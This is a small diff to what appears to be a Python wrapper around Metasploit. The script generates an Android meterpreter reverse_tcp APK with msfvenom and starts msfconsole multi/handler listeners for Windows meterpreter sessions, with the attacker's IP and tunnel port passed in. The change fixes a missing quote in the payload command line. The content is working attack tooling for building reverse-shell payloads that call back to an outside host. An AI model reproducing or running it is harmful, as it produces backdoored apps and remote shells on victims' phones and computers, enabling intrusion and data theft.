@@ -45,7 +45,7 @@ elif platform=='windows':
     os.system('sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST '+IPserver+'; set LPORT '+Porttunnel+'; run"')
 elif platform=='android':
   print("---------------Payload Creation---------------")
-  payload='msfvenom -p android/meterpreter/reverse_tcp LHOST='+IPserver+' LPORT='+Porttunnel+' -o '+output+'.apk
+  payload='msfvenom -p android/meterpreter/reverse_tcp LHOST='+IPserver+' LPORT='+Porttunnel+' -o '+output+'.apk'
   os.system('sudo msfvenom '+payload)
   print('---------------Starting---------------')
   listing=input('y/n: ')
